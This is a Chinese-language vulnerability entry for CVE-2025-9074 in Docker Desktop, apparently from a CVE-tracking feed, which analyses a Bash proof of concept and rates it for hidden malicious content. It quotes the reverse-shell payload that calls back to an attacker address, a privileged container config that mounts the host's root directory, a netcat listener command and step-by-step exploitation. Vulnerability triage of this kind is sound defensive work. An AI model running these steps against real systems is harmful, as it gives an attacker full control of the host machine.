## CVE-2025-9074 - Docker Desktop (Windows, macOS) 容器逃逸/未授权访问/远程代码执行

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸/未授权访问/远程代码执行

**影响应用:** Docker Desktop (Windows, macOS)

**危害等级:** 高危

**CVSS评分:** 9.3

**影响版本:** Docker Desktop < 4.44.3

**利用条件:** 本地运行的恶意容器可利用，无需认证，通过默认子网访问Docker Engine API

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-9074是一个影响Docker Desktop的高危漏洞，该漏洞允许本地运行的恶意Linux容器绕过隔离机制，通过默认子网（192.168.65.7:2375）直接访问Docker Engine API，从而实现容器逃逸和对宿主机的完全控制。该漏洞不依赖于挂载Docker socket，并且即使启用了增强容器隔离（ECI）或TCP暴露设置，也依然存在。该漏洞已于2025年8月20日在Docker Desktop 4.44.3版本中得到修复，影响所有早于此版本的Docker Desktop for Windows和macOS。

**POC有效性分析:**
该POC是一个名为`exploit.sh`的Bash脚本，旨在利用Docker Desktop的未授权访问漏洞CVE-2025-9074。脚本通过直接与Docker Engine API（默认地址为192.168.65.7:2375）进行HTTP通信来自动化攻击流程。它的有效性体现在以下几个方面：
1. **零依赖性与高可移植性：** 脚本完全由Bash编写，并依赖`curl`和`grep`等标准Linux工具，无需安装任何额外的第三方库或二进制文件。这使得POC在大多数Linux环境中（尤其是容器内部）都具有很高的可移植性和易用性。
2. **自动化API交互：** 脚本首先尝试从目标Docker Engine API获取可用的镜像列表，并选择其中一个（如`alpine`）作为基础镜像来创建恶意容器。这避免了手动探测或猜测镜像的繁琐。
3. **恶意容器配置：** POC核心在于利用Docker API创建了一个具有高权限的容器。它设置了`Privileged: true`（特权模式），`NetworkMode: host`（宿主机网络模式），以及最关键的`Binds: ["$MOUNT:/host"]`，即将宿主机的根目录挂载到容器内的`/host`路径。这些配置组合使得恶意容器能够突破隔离，获得对宿主机文件系统和网络的完全访问权限。
4. **远程代码执行：** 容器启动后，脚本通过`Cmd`参数在容器内执行`chroot /host /bin/sh -c 'sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1'`命令。这个命令的含义是在以宿主机根目录为新的根环境（`/host`）中，启动一个交互式shell，并将其标准输入、输出和错误重定向到攻击者指定的IP和端口（`$LHOST:$LPORT`），从而建立一个反向shell，实现了对宿主机的远程代码执行。
5. **参数化与错误处理：** 脚本支持通过命令行参数指定目标IP/端口、监听器IP/端口以及要挂载的宿主机路径，增加了灵活性。同时，它包含了对缺少必要参数或无法获取容器ID等情况的简单错误处理，增强了可用性。
综合来看，该POC功能完整，设计巧妙，能够有效地利用CVE-2025-9074漏洞实现容器逃逸和宿主机控制。

**利用步骤:**
1. **确认漏洞环境：** 目标系统运行的是Docker Desktop版本低于4.44.3，且本地Linux容器能够访问Docker Engine API（默认子网192.168.65.7:2375）。
2. **获取POC：** 下载或复制`exploit.sh`脚本到可执行环境中（例如，已受控的容器内部）。
3. **设置攻击者监听：** 在攻击者控制的机器上，使用`netcat`或其他工具设置监听端口，例如：`nc -lvnp <LPORT>`。
4. **执行POC脚本：** 从受感染的Docker容器内部（或具有网络访问权限的其他环境），执行POC脚本，并提供攻击者的监听IP和端口。例如：`./exploit.sh -l <攻击者IP> -p <LPORT>`。如果目标Docker Engine API不在默认IP和端口，可以指定：`./exploit.sh 192.168.65.7 2375 -l <攻击者IP> -p <LPORT>`。
5. **获取反向Shell：** 脚本执行成功后，恶意容器将在宿主机环境中创建一个反向shell连接到攻击者的监听器。攻击者将获得一个具有宿主机权限的shell，可以执行任意命令，例如：查看宿主机文件系统(`/host/etc/passwd`)、安装恶意软件、持久化访问等。

**投毒风险分析:**
该POC脚本（`exploit.sh`）的投毒风险评估为低风险（约10%）。判断依据如下：
1. **代码透明度高：** 脚本完全由Bash编写，代码逻辑清晰，易于阅读和理解。所有的API调用、容器配置和命令执行都以明文形式存在，没有使用任何混淆技术。这使得安全分析人员能够迅速地审计其所有行为，识别任何潜在的恶意功能。
2. **依赖标准工具：** 脚本仅依赖于`curl`和`grep`这两个几乎在所有Linux发行版中都预装的标准命令行工具。它没有引入任何复杂的第三方库、二进制文件或外部服务调用，这大大降低了引入供应链攻击或隐匿后门的风险。
3. **无外部链接或下载：** POC代码中没有包含任何从外部URL下载或执行可执行文件、脚本或其他资源的指令。其所有操作都仅限于通过HTTP请求与本地网络中的Docker API进行交互，并利用宿主机已有的工具集。
4. **意图明确：** 脚本的目的是明确且单一的：利用Docker Desktop的特定漏洞来实现容器逃逸和远程代码执行。它通过创建特权容器、挂载宿主机根目录并建立反向shell来达成这一目标。虽然反向shell本身是攻击行为的载体，但这属于漏洞利用的预期结果，而非POC代码本身的隐藏恶意功能。
5. **非持久化机制：** 该POC本身不包含任何在宿主机上建立持久化机制的代码（例如，修改启动项、添加定时任务等）。它仅在容器启动时执行一次性的反向shell命令。攻击者在获得shell后可能会手动设置持久化，但这已经超出POC脚本本身的范畴。
综上所述，虽然该POC能够导致严重的宿主机控制，但其代码本身干净，没有发现任何旨在秘密植入后门、窃取信息、破坏系统完整性或进行其他超出漏洞利用范围的投毒行为。因此，对于防御性安全研究而言，可以将其视为一个相对“干净”且专注于漏洞利用的技术演示，而非带有额外恶意载荷的样本。

**项目地址:** 

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-9074
